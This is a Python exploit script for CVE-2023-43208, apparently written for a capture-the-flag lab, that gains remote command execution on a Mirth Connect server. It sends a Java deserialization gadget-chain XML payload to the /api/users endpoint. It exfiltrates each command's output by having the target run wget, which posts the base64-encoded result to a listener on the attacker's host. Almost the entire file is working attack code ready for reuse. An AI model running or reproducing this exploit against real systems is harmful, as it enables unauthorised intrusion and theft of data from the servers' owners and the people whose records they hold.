#!/usr/bin/env python3
"""
CVE-2023-43208 RCE helper - execute commands and get output
Usage: python3 rce.py "command here"
"""

import requests
import warnings
import threading
import time
import http.server
import socketserver
import base64
import sys

warnings.filterwarnings("ignore")

TARGET = "https://10.129.1.43"
LHOST = "10.10.14.2"
PORT = 9877


def escape_xml(text):
    text = text.replace("&", "&amp;")
    text = text.replace("<", "&lt;")
    text = text.replace(">", "&gt;")
    text = text.replace('"', "&quot;")
    text = text.replace("'", "&apos;")
    return text


def build_payload(command):
    cmd = escape_xml(command)
    return f"""<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>getRuntime</string>
                            <java-class-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.Object</java-class>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <null/>
                            <object-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>{cmd}</string>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""


output_received = []


class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode() if length > 0 else ""
        output_received.append(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_GET(self):
        output_received.append(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass


def rce(command):
    """Execute a command on the target and return output"""
    output_received.clear()

    def start_server():
        try:
            with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
                httpd.timeout = 12
                httpd.handle_request()
        except:
            pass

    t = threading.Thread(target=start_server, daemon=True)
    t.start()
    time.sleep(0.5)

    headers = {"Content-Type": "application/xml", "X-Requested-With": "OpenAPI"}
    wrapped = f"sh -c $@|sh . echo {command}"
    exfil_cmd = f"wget --post-data=$({command} 2>&1 | base64 -w0) http://{LHOST}:{PORT}/out -q -O /dev/null"
    wrapped_exfil = f"sh -c $@|sh . echo {exfil_cmd}"
    payload = build_payload(wrapped_exfil)
    url = TARGET + "/api/users"

    try:
        requests.post(url, data=payload, headers=headers, verify=False, timeout=10)
    except:
        pass

    time.sleep(3)

    if output_received:
        for data in output_received:
            if data.startswith("/"):
                return data
            try:
                decoded = base64.b64decode(data).decode()
                return decoded
            except:
                return data
    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 rce.py 'command'")
        sys.exit(1)

    cmd = sys.argv[1]
    print(f"[*] Executing: {cmd}")
    result = rce(cmd)
    if result:
        print(result)
    else:
        print("[-] No output received")
